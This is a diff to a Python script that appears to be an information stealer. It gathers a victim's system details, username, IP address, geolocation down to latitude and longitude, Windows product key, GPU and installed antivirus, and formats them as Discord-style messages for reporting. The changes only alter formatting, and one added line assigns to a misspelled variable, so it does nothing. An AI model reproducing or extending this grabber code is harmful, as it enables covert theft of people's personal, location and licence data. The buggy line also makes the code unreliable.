@@ -432,6 +432,8 @@ pas = 'drowssaP'
 def systemInfo():
     try:
         system = os.name
+        if system == 'nt':
+            sustem = "Windows"
         node_name = os.getenv("COMPUTERNAME")
         release = os.getenv("SystemRoot").split("\\")[-1]
         version = os.getenv("OSVERSION_VERSION")
@@ -440,13 +442,13 @@ def systemInfo():
         home_dir = os.getenv("USERPROFILE")
 
         sys_info = f"System information:\n"\
-                f"{system}\n"\
-                f"Node name: {node_name}\n"\
-                f"Release: {release}\n"\
-                f"Version: {version}\n"\
-                f"Machine: {machine}\n"\
-                f"Processor: {processor}\n"\
-                f"Home directory: {home_dir}\n"
+                f"`{system}`\n"\
+                f"Node name: `{node_name}`\n"\
+                f"Release: `{release}`\n"\
+                f"Version: `{version}`\n"\
+                f"Machine: `{machine}`\n"\
+                f"Processor: `{processor}`\n"\
+                f"Home directory: `{home_dir}`\n"
 
         return sys_info
     except:
@@ -546,7 +548,7 @@ def globalInfo():
     except:
         gpu = "error"
 
-    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU  : ```{gpu}``` \n`Latitude + Longitude  : ```{latitude}, {longitude}```\n Installed antivirus :\n```{avss}``` "
+    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU  : ```{gpu}``` \nLatitude + Longitude  : ```{latitude}, {longitude}```\n Installed antivirus :\n```{avss}``` "
     if len(globalinfo) > 1750:
         globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
         
